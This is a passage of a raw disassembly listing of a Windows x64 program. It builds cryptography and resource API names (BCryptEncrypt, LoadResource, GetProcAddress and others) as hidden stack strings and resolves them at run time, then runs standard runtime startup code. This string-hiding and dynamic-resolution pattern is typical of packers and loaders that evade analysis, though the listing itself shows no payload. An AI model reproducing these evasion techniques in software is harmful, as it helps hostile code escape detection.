   140002cab:	48 89 5c 24 70       	mov    %rbx,0x70(%rsp)
   140002cb0:	c7 45 e0 62 63 72 79 	movl   $0x79726362,-0x20(%rbp)
   140002cb7:	c7 45 e4 70 74 2e 64 	movl   $0x642e7470,-0x1c(%rbp)
   140002cbe:	66 c7 45 e8 6c 6c    	movw   $0x6c6c,-0x18(%rbp)
   140002cc4:	c6 45 ea 00          	movb   $0x0,-0x16(%rbp)
   140002cc8:	ff d0                	call   *%rax
   140002cca:	48 8b d8             	mov    %rax,%rbx
   140002ccd:	48 85 c0             	test   %rax,%rax
   140002cd0:	0f 84 24 01 00 00    	je     0x140002dfa
   140002cd6:	66 0f 6f 05 72 e0 00 	movdqa 0xe072(%rip),%xmm0        # 0x140010d50
   140002cdd:	00 
   140002cde:	48 8d 55 c0          	lea    -0x40(%rbp),%rdx
   140002ce2:	48 8b c8             	mov    %rax,%rcx
   140002ce5:	c7 45 d0 74 68 6d 50 	movl   $0x506d6874,-0x30(%rbp)
   140002cec:	f3 0f 7f 45 c0       	movdqu %xmm0,-0x40(%rbp)
   140002cf1:	c7 45 d4 72 6f 76 69 	movl   $0x69766f72,-0x2c(%rbp)
   140002cf8:	c7 45 d8 64 65 72 00 	movl   $0x726564,-0x28(%rbp)
   140002cff:	ff 15 fb d2 00 00    	call   *0xd2fb(%rip)        # 0x140010000
   140002d05:	66 0f 6f 05 a3 e0 00 	movdqa 0xe0a3(%rip),%xmm0        # 0x140010db0
   140002d0c:	00 
   140002d0d:	48 8d 55 c0          	lea    -0x40(%rbp),%rdx
   140002d11:	48 8b cb             	mov    %rbx,%rcx
   140002d14:	48 89 05 5d be 01 00 	mov    %rax,0x1be5d(%rip)        # 0x14001eb78
   140002d1b:	f3 0f 7f 45 c0       	movdqu %xmm0,-0x40(%rbp)
   140002d20:	66 c7 45 d0 79 00    	movw   $0x79,-0x30(%rbp)
   140002d26:	ff 15 d4 d2 00 00    	call   *0xd2d4(%rip)        # 0x140010000
   140002d2c:	66 0f 6f 05 8c e0 00 	movdqa 0xe08c(%rip),%xmm0        # 0x140010dc0
   140002d33:	00 
   140002d34:	48 8d 55 c0          	lea    -0x40(%rbp),%rdx
   140002d38:	48 8b cb             	mov    %rbx,%rcx
   140002d3b:	48 89 05 3e be 01 00 	mov    %rax,0x1be3e(%rip)        # 0x14001eb80
   140002d42:	f3 0f 7f 45 c0       	movdqu %xmm0,-0x40(%rbp)
   140002d47:	c7 45 d0 6d 6d 65 74 	movl   $0x74656d6d,-0x30(%rbp)
   140002d4e:	c7 45 d4 72 69 63 4b 	movl   $0x4b636972,-0x2c(%rbp)
   140002d55:	66 c7 45 d8 65 79    	movw   $0x7965,-0x28(%rbp)
   140002d5b:	c6 45 da 00          	movb   $0x0,-0x26(%rbp)
   140002d5f:	ff 15 9b d2 00 00    	call   *0xd29b(%rip)        # 0x140010000
   140002d65:	48 8d 55 c0          	lea    -0x40(%rbp),%rdx
   140002d69:	c7 45 c0 42 43 72 79 	movl   $0x79724342,-0x40(%rbp)
   140002d70:	48 8b cb             	mov    %rbx,%rcx
   140002d73:	48 89 05 0e be 01 00 	mov    %rax,0x1be0e(%rip)        # 0x14001eb88
   140002d7a:	c7 45 c4 70 74 45 6e 	movl   $0x6e457470,-0x3c(%rbp)
   140002d81:	c7 45 c8 63 72 79 70 	movl   $0x70797263,-0x38(%rbp)
   140002d88:	66 c7 45 cc 74 00    	movw   $0x74,-0x34(%rbp)
   140002d8e:	ff 15 6c d2 00 00    	call   *0xd26c(%rip)        # 0x140010000
   140002d94:	66 0f 6f 05 34 e0 00 	movdqa 0xe034(%rip),%xmm0        # 0x140010dd0
   140002d9b:	00 
   140002d9c:	48 8d 55 c0          	lea    -0x40(%rbp),%rdx
   140002da0:	48 8b cb             	mov    %rbx,%rcx
   140002da3:	48 89 05 e6 bd 01 00 	mov    %rax,0x1bde6(%rip)        # 0x14001eb90
   140002daa:	f3 0f 7f 45 c0       	movdqu %xmm0,-0x40(%rbp)
   140002daf:	c6 45 d0 00          	movb   $0x0,-0x30(%rbp)
   140002db3:	ff 15 47 d2 00 00    	call   *0xd247(%rip)        # 0x140010000
   140002db9:	66 0f 6f 05 cf df 00 	movdqa 0xdfcf(%rip),%xmm0        # 0x140010d90
   140002dc0:	00 
   140002dc1:	48 8d 55 c0          	lea    -0x40(%rbp),%rdx
   140002dc5:	48 8b cb             	mov    %rbx,%rcx
   140002dc8:	48 89 05 c9 bd 01 00 	mov    %rax,0x1bdc9(%rip)        # 0x14001eb98
   140002dcf:	f3 0f 7f 45 c0       	movdqu %xmm0,-0x40(%rbp)
   140002dd4:	c7 45 d0 69 74 68 6d 	movl   $0x6d687469,-0x30(%rbp)
   140002ddb:	c7 45 d4 50 72 6f 76 	movl   $0x766f7250,-0x2c(%rbp)
   140002de2:	c7 45 d8 69 64 65 72 	movl   $0x72656469,-0x28(%rbp)
   140002de9:	c6 45 dc 00          	movb   $0x0,-0x24(%rbp)
   140002ded:	ff 15 0d d2 00 00    	call   *0xd20d(%rip)        # 0x140010000
   140002df3:	48 89 05 a6 bd 01 00 	mov    %rax,0x1bda6(%rip)        # 0x14001eba0
   140002dfa:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   140002dff:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140002e03:	48 33 cc             	xor    %rsp,%rcx
   140002e06:	e8 05 03 00 00       	call   0x140003110
   140002e0b:	48 83 c4 60          	add    $0x60,%rsp
   140002e0f:	5d                   	pop    %rbp
   140002e10:	c3                   	ret
   140002e11:	cc                   	int3
   140002e12:	cc                   	int3
   140002e13:	cc                   	int3
   140002e14:	cc                   	int3
   140002e15:	cc                   	int3
   140002e16:	cc                   	int3
   140002e17:	cc                   	int3
   140002e18:	cc                   	int3
   140002e19:	cc                   	int3
   140002e1a:	cc                   	int3
   140002e1b:	cc                   	int3
   140002e1c:	cc                   	int3
   140002e1d:	cc                   	int3
   140002e1e:	cc                   	int3
   140002e1f:	cc                   	int3
   140002e20:	40 55                	rex push %rbp
   140002e22:	48 8b ec             	mov    %rsp,%rbp
   140002e25:	48 83 ec 50          	sub    $0x50,%rsp
   140002e29:	48 8b 05 d0 b1 01 00 	mov    0x1b1d0(%rip),%rax        # 0x14001e000
   140002e30:	48 33 c4             	xor    %rsp,%rax
   140002e33:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140002e37:	48 8b 0d 8a bd 01 00 	mov    0x1bd8a(%rip),%rcx        # 0x14001ebc8
   140002e3e:	48 85 c9             	test   %rcx,%rcx
   140002e41:	0f 84 c5 00 00 00    	je     0x140002f0c
   140002e47:	48 8d 55 d0          	lea    -0x30(%rbp),%rdx
   140002e4b:	c7 45 d0 46 69 6e 64 	movl   $0x646e6946,-0x30(%rbp)
   140002e52:	c7 45 d4 52 65 73 6f 	movl   $0x6f736552,-0x2c(%rbp)
   140002e59:	c7 45 d8 75 72 63 65 	movl   $0x65637275,-0x28(%rbp)
   140002e60:	66 c7 45 dc 41 00    	movw   $0x41,-0x24(%rbp)
   140002e66:	ff 15 94 d1 00 00    	call   *0xd194(%rip)        # 0x140010000
   140002e6c:	48 8b 0d 55 bd 01 00 	mov    0x1bd55(%rip),%rcx        # 0x14001ebc8
   140002e73:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   140002e77:	48 89 05 2a bd 01 00 	mov    %rax,0x1bd2a(%rip)        # 0x14001eba8
   140002e7e:	c7 45 e0 4c 6f 61 64 	movl   $0x64616f4c,-0x20(%rbp)
   140002e85:	c7 45 e4 52 65 73 6f 	movl   $0x6f736552,-0x1c(%rbp)
   140002e8c:	c7 45 e8 75 72 63 65 	movl   $0x65637275,-0x18(%rbp)
   140002e93:	c6 45 ec 00          	movb   $0x0,-0x14(%rbp)
   140002e97:	ff 15 63 d1 00 00    	call   *0xd163(%rip)        # 0x140010000
   140002e9d:	48 8b 0d 24 bd 01 00 	mov    0x1bd24(%rip),%rcx        # 0x14001ebc8
   140002ea4:	48 8d 55 d0          	lea    -0x30(%rbp),%rdx
   140002ea8:	48 89 05 01 bd 01 00 	mov    %rax,0x1bd01(%rip)        # 0x14001ebb0
   140002eaf:	c7 45 d0 4c 6f 63 6b 	movl   $0x6b636f4c,-0x30(%rbp)
   140002eb6:	c7 45 d4 52 65 73 6f 	movl   $0x6f736552,-0x2c(%rbp)
   140002ebd:	c7 45 d8 75 72 63 65 	movl   $0x65637275,-0x28(%rbp)
   140002ec4:	c6 45 dc 00          	movb   $0x0,-0x24(%rbp)
   140002ec8:	ff 15 32 d1 00 00    	call   *0xd132(%rip)        # 0x140010000
   140002ece:	48 8b 0d f3 bc 01 00 	mov    0x1bcf3(%rip),%rcx        # 0x14001ebc8
   140002ed5:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   140002ed9:	48 89 05 d8 bc 01 00 	mov    %rax,0x1bcd8(%rip)        # 0x14001ebb8
   140002ee0:	c7 45 e0 53 69 7a 65 	movl   $0x657a6953,-0x20(%rbp)
   140002ee7:	c7 45 e4 6f 66 52 65 	movl   $0x6552666f,-0x1c(%rbp)
   140002eee:	c7 45 e8 73 6f 75 72 	movl   $0x72756f73,-0x18(%rbp)
   140002ef5:	66 c7 45 ec 63 65    	movw   $0x6563,-0x14(%rbp)
   140002efb:	c6 45 ee 00          	movb   $0x0,-0x12(%rbp)
   140002eff:	ff 15 fb d0 00 00    	call   *0xd0fb(%rip)        # 0x140010000
   140002f05:	48 89 05 b4 bc 01 00 	mov    %rax,0x1bcb4(%rip)        # 0x14001ebc0
   140002f0c:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140002f10:	48 33 cc             	xor    %rsp,%rcx
   140002f13:	e8 f8 01 00 00       	call   0x140003110
   140002f18:	48 83 c4 50          	add    $0x50,%rsp
   140002f1c:	5d                   	pop    %rbp
   140002f1d:	c3                   	ret
   140002f1e:	cc                   	int3
   140002f1f:	cc                   	int3
   140002f20:	40 55                	rex push %rbp
   140002f22:	48 8b ec             	mov    %rsp,%rbp
   140002f25:	48 83 ec 60          	sub    $0x60,%rsp
   140002f29:	48 8b 05 d0 b0 01 00 	mov    0x1b0d0(%rip),%rax        # 0x14001e000
   140002f30:	48 33 c4             	xor    %rsp,%rax
   140002f33:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140002f37:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   140002f3b:	c7 45 c0 6b 65 72 6e 	movl   $0x6e72656b,-0x40(%rbp)
   140002f42:	c7 45 c4 65 6c 33 32 	movl   $0x32336c65,-0x3c(%rbp)
   140002f49:	c7 45 c8 2e 64 6c 6c 	movl   $0x6c6c642e,-0x38(%rbp)
   140002f50:	c6 45 cc 00          	movb   $0x0,-0x34(%rbp)
   140002f54:	c7 45 d0 4c 6f 61 64 	movl   $0x64616f4c,-0x30(%rbp)
   140002f5b:	c7 45 d4 4c 69 62 72 	movl   $0x7262694c,-0x2c(%rbp)
   140002f62:	c7 45 d8 61 72 79 41 	movl   $0x41797261,-0x28(%rbp)
   140002f69:	c6 45 dc 00          	movb   $0x0,-0x24(%rbp)
   140002f6d:	c7 45 e0 47 65 74 50 	movl   $0x50746547,-0x20(%rbp)
   140002f74:	c7 45 e4 72 6f 63 41 	movl   $0x41636f72,-0x1c(%rbp)
   140002f7b:	c7 45 e8 64 64 72 65 	movl   $0x65726464,-0x18(%rbp)
   140002f82:	66 c7 45 ec 73 73    	movw   $0x7373,-0x14(%rbp)
   140002f88:	c6 45 ee 00          	movb   $0x0,-0x12(%rbp)
   140002f8c:	ff 15 76 d0 00 00    	call   *0xd076(%rip)        # 0x140010008
   140002f92:	48 89 05 2f bc 01 00 	mov    %rax,0x1bc2f(%rip)        # 0x14001ebc8
   140002f99:	48 85 c0             	test   %rax,%rax
   140002f9c:	74 2c                	je     0x140002fca
   140002f9e:	48 8d 55 d0          	lea    -0x30(%rbp),%rdx
   140002fa2:	48 8b c8             	mov    %rax,%rcx
   140002fa5:	ff 15 55 d0 00 00    	call   *0xd055(%rip)        # 0x140010000
   140002fab:	48 8b 0d 16 bc 01 00 	mov    0x1bc16(%rip),%rcx        # 0x14001ebc8
   140002fb2:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   140002fb6:	48 89 05 f3 ba 01 00 	mov    %rax,0x1baf3(%rip)        # 0x14001eab0
   140002fbd:	ff 15 3d d0 00 00    	call   *0xd03d(%rip)        # 0x140010000
   140002fc3:	48 89 05 ee ba 01 00 	mov    %rax,0x1baee(%rip)        # 0x14001eab8
   140002fca:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140002fce:	48 33 cc             	xor    %rsp,%rcx
   140002fd1:	e8 3a 01 00 00       	call   0x140003110
   140002fd6:	48 83 c4 60          	add    $0x60,%rsp
   140002fda:	5d                   	pop    %rbp
   140002fdb:	c3                   	ret
   140002fdc:	cc                   	int3
   140002fdd:	cc                   	int3
   140002fde:	cc                   	int3
   140002fdf:	cc                   	int3
   140002fe0:	48 83 ec 28          	sub    $0x28,%rsp
   140002fe4:	e8 37 ff ff ff       	call   0x140002f20
   140002fe9:	e8 72 f7 ff ff       	call   0x140002760
   140002fee:	e8 ad f8 ff ff       	call   0x1400028a0
   140002ff3:	e8 c8 f9 ff ff       	call   0x1400029c0
   140002ff8:	e8 e3 fa ff ff       	call   0x140002ae0
   140002ffd:	e8 7e fc ff ff       	call   0x140002c80
   140003002:	48 83 c4 28          	add    $0x28,%rsp
   140003006:	e9 15 fe ff ff       	jmp    0x140002e20
   14000300b:	cc                   	int3
   14000300c:	cc                   	int3
   14000300d:	cc                   	int3
   14000300e:	cc                   	int3
   14000300f:	cc                   	int3
   140003010:	48 83 ec 28          	sub    $0x28,%rsp
   140003014:	81 fa 13 01 00 00    	cmp    $0x113,%edx
   14000301a:	75 39                	jne    0x140003055
   14000301c:	49 81 f8 cc 1c 00 00 	cmp    $0x1ccc,%r8
   140003023:	75 35                	jne    0x14000305a
   140003025:	83 3d a4 bb 01 00 00 	cmpl   $0x0,0x1bba4(%rip)        # 0x14001ebd0
   14000302c:	75 2c                	jne    0x14000305a
   14000302e:	49 8b d0             	mov    %r8,%rdx
   140003031:	c7 05 95 bb 01 00 01 	movl   $0x1,0x1bb95(%rip)        # 0x14001ebd0
   140003038:	00 00 00 
   14000303b:	ff 15 07 d2 00 00    	call   *0xd207(%rip)        # 0x140010248
   140003041:	e8 7a e7 ff ff       	call   0x1400017c0
   140003046:	33 c9                	xor    %ecx,%ecx
   140003048:	ff 15 22 d2 00 00    	call   *0xd222(%rip)        # 0x140010270
   14000304e:	33 c0                	xor    %eax,%eax
   140003050:	48 83 c4 28          	add    $0x28,%rsp
   140003054:	c3                   	ret
   140003055:	83 fa 02             	cmp    $0x2,%edx
   140003058:	74 ec                	je     0x140003046
   14000305a:	48 83 c4 28          	add    $0x28,%rsp
   14000305e:	48 ff 25 eb d1 00 00 	rex.W jmp *0xd1eb(%rip)        # 0x140010250
   140003065:	cc                   	int3
   140003066:	cc                   	int3
   140003067:	cc                   	int3
   140003068:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000306d:	cd 29                	int    $0x29
   14000306f:	c3                   	ret
   140003070:	b9 08 00 00 00       	mov    $0x8,%ecx
   140003075:	cd 29                	int    $0x29
   140003077:	c3                   	ret
   140003078:	48 83 ec 28          	sub    $0x28,%rsp
   14000307c:	4d 8b 41 38          	mov    0x38(%r9),%r8
   140003080:	48 8b ca             	mov    %rdx,%rcx
   140003083:	49 8b d1             	mov    %r9,%rdx
   140003086:	e8 0d 00 00 00       	call   0x140003098
   14000308b:	b8 01 00 00 00       	mov    $0x1,%eax
   140003090:	48 83 c4 28          	add    $0x28,%rsp
   140003094:	c3                   	ret
   140003095:	cc                   	int3
   140003096:	cc                   	int3
   140003097:	cc                   	int3
   140003098:	4c 8b d1             	mov    %rcx,%r10
   14000309b:	4c 8b da             	mov    %rdx,%r11
   14000309e:	41 8b 08             	mov    (%r8),%ecx
   1400030a1:	83 e1 f8             	and    $0xfffffff8,%ecx
   1400030a4:	41 f6 00 04          	testb  $0x4,(%r8)
   1400030a8:	74 15                	je     0x1400030bf
   1400030aa:	41 8b 40 08          	mov    0x8(%r8),%eax
   1400030ae:	4d 63 48 04          	movslq 0x4(%r8),%r9
   1400030b2:	f7 d8                	neg    %eax
   1400030b4:	48 63 d0             	movslq %eax,%rdx
   1400030b7:	4d 03 ca             	add    %r10,%r9
   1400030ba:	4c 23 ca             	and    %rdx,%r9
   1400030bd:	eb 03                	jmp    0x1400030c2
   1400030bf:	4d 8b ca             	mov    %r10,%r9
   1400030c2:	48 63 c1             	movslq %ecx,%rax
   1400030c5:	4a 8b 14 08          	mov    (%rax,%r9,1),%rdx
   1400030c9:	49 8b 43 10          	mov    0x10(%r11),%rax
   1400030cd:	8b 48 08             	mov    0x8(%rax),%ecx
   1400030d0:	49 8b 43 08          	mov    0x8(%r11),%rax
   1400030d4:	f6 44 01 03 0f       	testb  $0xf,0x3(%rcx,%rax,1)
   1400030d9:	74 12                	je     0x1400030ed
   1400030db:	0f b6 44 01 03       	movzbl 0x3(%rcx,%rax,1),%eax
   1400030e0:	b9 f0 ff ff ff       	mov    $0xfffffff0,%ecx
   1400030e5:	48 23 c1             	and    %rcx,%rax
   1400030e8:	49 03 c2             	add    %r10,%rax
   1400030eb:	eb 03                	jmp    0x1400030f0
   1400030ed:	49 8b c2             	mov    %r10,%rax
   1400030f0:	48 33 d0             	xor    %rax,%rdx
   1400030f3:	48 8b ca             	mov    %rdx,%rcx
   1400030f6:	e9 15 00 00 00       	jmp    0x140003110
   1400030fb:	cc                   	int3
   1400030fc:	cc                   	int3
   1400030fd:	cc                   	int3
   1400030fe:	cc                   	int3
   1400030ff:	cc                   	int3
   140003100:	cc                   	int3
   140003101:	cc                   	int3
   140003102:	cc                   	int3
   140003103:	cc                   	int3
   140003104:	cc                   	int3
   140003105:	cc                   	int3
   140003106:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000310d:	00 00 00 
   140003110:	48 3b 0d e9 ae 01 00 	cmp    0x1aee9(%rip),%rcx        # 0x14001e000
   140003117:	75 10                	jne    0x140003129
   140003119:	48 c1 c1 10          	rol    $0x10,%rcx
   14000311d:	66 f7 c1 ff ff       	test   $0xffff,%cx
   140003122:	75 01                	jne    0x140003125
   140003124:	c3                   	ret
   140003125:	48 c1 c9 10          	ror    $0x10,%rcx
   140003129:	e9 3a ff ff ff       	jmp    0x140003068
   14000312e:	cc                   	int3
   14000312f:	cc                   	int3
   140003130:	40 53                	rex push %rbx
   140003132:	48 83 ec 20          	sub    $0x20,%rsp
   140003136:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000313b:	e8 cc 2f 00 00       	call   0x14000610c
   140003140:	e8 4f 05 00 00       	call   0x140003694
   140003145:	8b c8                	mov    %eax,%ecx
   140003147:	e8 cc 39 00 00       	call   0x140006b18
   14000314c:	e8 5f ef ff ff       	call   0x1400020b0
   140003151:	8b d8                	mov    %eax,%ebx
   140003153:	e8 54 3b 00 00       	call   0x140006cac
   140003158:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000315d:	89 18                	mov    %ebx,(%rax)
   14000315f:	e8 b0 02 00 00       	call   0x140003414
   140003164:	84 c0                	test   %al,%al
   140003166:	74 73                	je     0x1400031db
   140003168:	e8 a7 06 00 00       	call   0x140003814
   14000316d:	48 8d 0d dc 06 00 00 	lea    0x6dc(%rip),%rcx        # 0x140003850
   140003174:	e8 4b 04 00 00       	call   0x1400035c4
   140003179:	e8 0e 05 00 00       	call   0x14000368c
   14000317e:	8b c8                	mov    %eax,%ecx
   140003180:	e8 ef 31 00 00       	call   0x140006374
   140003185:	85 c0                	test   %eax,%eax
   140003187:	75 52                	jne    0x1400031db
   140003189:	e8 0e 05 00 00       	call   0x14000369c
   14000318e:	e8 4d 05 00 00       	call   0x1400036e0
   140003193:	85 c0                	test   %eax,%eax
   140003195:	74 0c                	je     0x1400031a3
   140003197:	48 8d 0d 12 ef ff ff 	lea    -0x10ee(%rip),%rcx        # 0x1400020b0
   14000319e:	e8 8d 2f 00 00       	call   0x140006130
   1400031a3:	e8 08 05 00 00       	call   0x1400036b0
   1400031a8:	e8 03 05 00 00       	call   0x1400036b0
   1400031ad:	e8 fe ee ff ff       	call   0x1400020b0
   1400031b2:	8b c8                	mov    %eax,%ecx
   1400031b4:	e8 4b 3a 00 00       	call   0x140006c04
   1400031b9:	e8 ee 04 00 00       	call   0x1400036ac
   1400031be:	84 c0                	test   %al,%al
   1400031c0:	74 05                	je     0x1400031c7
   1400031c2:	e8 75 35 00 00       	call   0x14000673c
   1400031c7:	e8 e4 ee ff ff       	call   0x1400020b0
   1400031cc:	e8 7b 05 00 00       	call   0x14000374c
   1400031d1:	85 c0                	test   %eax,%eax
   1400031d3:	75 06                	jne    0x1400031db
   1400031d5:	48 83 c4 20          	add    $0x20,%rsp
   1400031d9:	5b                   	pop    %rbx
   1400031da:	c3                   	ret
   1400031db:	b9 07 00 00 00       	mov    $0x7,%ecx
   1400031e0:	e8 23 05 00 00       	call   0x140003708
   1400031e5:	cc                   	int3
   1400031e6:	cc                   	int3
   1400031e7:	cc                   	int3
   1400031e8:	48 83 ec 28          	sub    $0x28,%rsp
   1400031ec:	e8 d3 04 00 00       	call   0x1400036c4
   1400031f1:	33 c0                	xor    %eax,%eax
   1400031f3:	48 83 c4 28          	add    $0x28,%rsp
   1400031f7:	c3                   	ret
   1400031f8:	48 83 ec 28          	sub    $0x28,%rsp
   1400031fc:	e8 a7 05 00 00       	call   0x1400037a8
   140003201:	e8 aa ee ff ff       	call   0x1400020b0
   140003206:	8b c8                	mov    %eax,%ecx
   140003208:	48 83 c4 28          	add    $0x28,%rsp
   14000320c:	e9 6f 3a 00 00       	jmp    0x140006c80
   140003211:	cc                   	int3
   140003212:	cc                   	int3
   140003213:	cc                   	int3
   140003214:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003219:	57                   	push   %rdi
   14000321a:	48 83 ec 30          	sub    $0x30,%rsp
   14000321e:	b9 01 00 00 00       	mov    $0x1,%ecx
   140003223:	e8 b0 01 00 00       	call   0x1400033d8
   140003228:	84 c0                	test   %al,%al
   14000322a:	0f 84 30 01 00 00    	je     0x140003360
   140003230:	40 32 ff             	xor    %dil,%dil
   140003233:	40 88 7c 24 20       	mov    %dil,0x20(%rsp)
   140003238:	e8 5f 01 00 00       	call   0x14000339c
   14000323d:	8a d8                	mov    %al,%bl
   14000323f:	8b 0d 93 b9 01 00    	mov    0x1b993(%rip),%ecx        # 0x14001ebd8
   140003245:	83 f9 01             	cmp    $0x1,%ecx
   140003248:	0f 84 1d 01 00 00    	je     0x14000336b
   14000324e:	85 c9                	test   %ecx,%ecx
   140003250:	75 4a                	jne    0x14000329c
   140003252:	c7 05 7c b9 01 00 01 	movl   $0x1,0x1b97c(%rip)        # 0x14001ebd8
   140003259:	00 00 00 
   14000325c:	48 8d 15 a5 d0 00 00 	lea    0xd0a5(%rip),%rdx        # 0x140010308
   140003263:	48 8d 0d 66 d0 00 00 	lea    0xd066(%rip),%rcx        # 0x1400102d0
   14000326a:	e8 81 35 00 00       	call   0x1400067f0
   14000326f:	85 c0                	test   %eax,%eax
   140003271:	74 0a                	je     0x14000327d
   140003273:	b8 ff 00 00 00       	mov    $0xff,%eax
   140003278:	e9 d8 00 00 00       	jmp    0x140003355
   14000327d:	48 8d 15 44 d0 00 00 	lea    0xd044(%rip),%rdx        # 0x1400102c8
   140003284:	48 8d 0d 2d d0 00 00 	lea    0xd02d(%rip),%rcx        # 0x1400102b8
   14000328b:	e8 28 35 00 00       	call   0x1400067b8
   140003290:	c7 05 3e b9 01 00 02 	movl   $0x2,0x1b93e(%rip)        # 0x14001ebd8
   140003297:	00 00 00 
   14000329a:	eb 08                	jmp    0x1400032a4
   14000329c:	40 b7 01             	mov    $0x1,%dil
   14000329f:	40 88 7c 24 20       	mov    %dil,0x20(%rsp)
   1400032a4:	8a cb                	mov    %bl,%cl
   1400032a6:	e8 8d 02 00 00       	call   0x140003538
   1400032ab:	e8 3c 04 00 00       	call   0x1400036ec
   1400032b0:	48 8b d8             	mov    %rax,%rbx
   1400032b3:	48 83 38 00          	cmpq   $0x0,(%rax)
   1400032b7:	74 1e                	je     0x1400032d7
   1400032b9:	48 8b c8             	mov    %rax,%rcx
   1400032bc:	e8 df 01 00 00       	call   0x1400034a0
   1400032c1:	84 c0                	test   %al,%al
   1400032c3:	74 12                	je     0x1400032d7
   1400032c5:	45 33 c0             	xor    %r8d,%r8d
   1400032c8:	41 8d 50 02          	lea    0x2(%r8),%edx
   1400032cc:	33 c9                	xor    %ecx,%ecx
   1400032ce:	48 8b 03             	mov    (%rbx),%rax
   1400032d1:	ff 15 b9 cf 00 00    	call   *0xcfb9(%rip)        # 0x140010290
   1400032d7:	e8 18 04 00 00       	call   0x1400036f4
   1400032dc:	48 8b d8             	mov    %rax,%rbx
   1400032df:	48 83 38 00          	cmpq   $0x0,(%rax)
   1400032e3:	74 14                	je     0x1400032f9
   1400032e5:	48 8b c8             	mov    %rax,%rcx
   1400032e8:	e8 b3 01 00 00       	call   0x1400034a0
   1400032ed:	84 c0                	test   %al,%al
   1400032ef:	74 08                	je     0x1400032f9
   1400032f1:	48 8b 0b             	mov    (%rbx),%rcx
   1400032f4:	e8 d7 37 00 00       	call   0x140006ad0
   1400032f9:	e8 12 04 00 00       	call   0x140003710
   1400032fe:	0f b7 d8             	movzwl %ax,%ebx
   140003301:	e8 3e 34 00 00       	call   0x140006744
   140003306:	44 8b cb             	mov    %ebx,%r9d
   140003309:	4c 8b c0             	mov    %rax,%r8
   14000330c:	33 d2                	xor    %edx,%edx
   14000330e:	48 8d 0d eb cc ff ff 	lea    -0x3315(%rip),%rcx        # 0x140000000
   140003315:	e8 e6 dc ff ff       	call   0x140001000
   14000331a:	8b d8                	mov    %eax,%ebx
   14000331c:	e8 33 04 00 00       	call   0x140003754
   140003321:	84 c0                	test   %al,%al
   140003323:	74 50                	je     0x140003375
   140003325:	40 84 ff             	test   %dil,%dil
   140003328:	75 05                	jne    0x14000332f
   14000332a:	e8 85 37 00 00       	call   0x140006ab4
   14000332f:	33 d2                	xor    %edx,%edx
   140003331:	b1 01                	mov    $0x1,%cl
   140003333:	e8 24 02 00 00       	call   0x14000355c
   140003338:	8b c3                	mov    %ebx,%eax
   14000333a:	eb 19                	jmp    0x140003355
   14000333c:	8b d8                	mov    %eax,%ebx
   14000333e:	e8 11 04 00 00       	call   0x140003754
   140003343:	84 c0                	test   %al,%al
   140003345:	74 36                	je     0x14000337d
   140003347:	80 7c 24 20 00       	cmpb   $0x0,0x20(%rsp)
   14000334c:	75 05                	jne    0x140003353
   14000334e:	e8 51 37 00 00       	call   0x140006aa4
   140003353:	8b c3                	mov    %ebx,%eax
   140003355:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000335a:	48 83 c4 30          	add    $0x30,%rsp
   14000335e:	5f                   	pop    %rdi
   14000335f:	c3                   	ret
   140003360:	b9 07 00 00 00       	mov    $0x7,%ecx
   140003365:	e8 9e 03 00 00       	call   0x140003708
   14000336a:	90                   	nop
   14000336b:	b9 07 00 00 00       	mov    $0x7,%ecx
   140003370:	e8 93 03 00 00       	call   0x140003708
   140003375:	8b cb                	mov    %ebx,%ecx
   140003377:	e8 90 37 00 00       	call   0x140006b0c
   14000337c:	90                   	nop
   14000337d:	8b cb                	mov    %ebx,%ecx
   14000337f:	e8 40 37 00 00       	call   0x140006ac4
   140003384:	90                   	nop
   140003385:	cc                   	int3
   140003386:	cc                   	int3
   140003387:	cc                   	int3
   140003388:	48 83 ec 28          	sub    $0x28,%rsp
   14000338c:	e8 4b 02 00 00       	call   0x1400035dc
   140003391:	48 83 c4 28          	add    $0x28,%rsp
   140003395:	e9 7a fe ff ff       	jmp    0x140003214
   14000339a:	cc                   	int3
   14000339b:	cc                   	int3
   14000339c:	48 83 ec 28          	sub    $0x28,%rsp
   1400033a0:	e8 83 07 00 00       	call   0x140003b28
   1400033a5:	85 c0                	test   %eax,%eax
   1400033a7:	74 21                	je     0x1400033ca
   1400033a9:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   1400033b0:	00 00 
   1400033b2:	48 8b 48 08          	mov    0x8(%rax),%rcx
   1400033b6:	eb 05                	jmp    0x1400033bd
   1400033b8:	48 3b c8             	cmp    %rax,%rcx
   1400033bb:	74 14                	je     0x1400033d1
   1400033bd:	33 c0                	xor    %eax,%eax
   1400033bf:	f0 48 0f b1 0d 18 b8 	lock cmpxchg %rcx,0x1b818(%rip)        # 0x14001ebe0
   1400033c6:	01 00 
   1400033c8:	75 ee                	jne    0x1400033b8
   1400033ca:	32 c0                	xor    %al,%al
   1400033cc:	48 83 c4 28          	add    $0x28,%rsp
   1400033d0:	c3                   	ret
   1400033d1:	b0 01                	mov    $0x1,%al
   1400033d3:	eb f7                	jmp    0x1400033cc
   1400033d5:	cc                   	int3
   1400033d6:	cc                   	int3
   1400033d7:	cc                   	int3
   1400033d8:	48 83 ec 28          	sub    $0x28,%rsp
   1400033dc:	85 c9                	test   %ecx,%ecx
   1400033de:	75 07                	jne    0x1400033e7
   1400033e0:	c6 05 01 b8 01 00 01 	movb   $0x1,0x1b801(%rip)        # 0x14001ebe8
   1400033e7:	e8 a0 04 00 00       	call   0x14000388c
   1400033ec:	e8 57 09 00 00       	call   0x140003d48
   1400033f1:	84 c0                	test   %al,%al
   1400033f3:	75 04                	jne    0x1400033f9
   1400033f5:	32 c0                	xor    %al,%al
   1400033f7:	eb 14                	jmp    0x14000340d
   1400033f9:	e8 e6 3d 00 00       	call   0x1400071e4
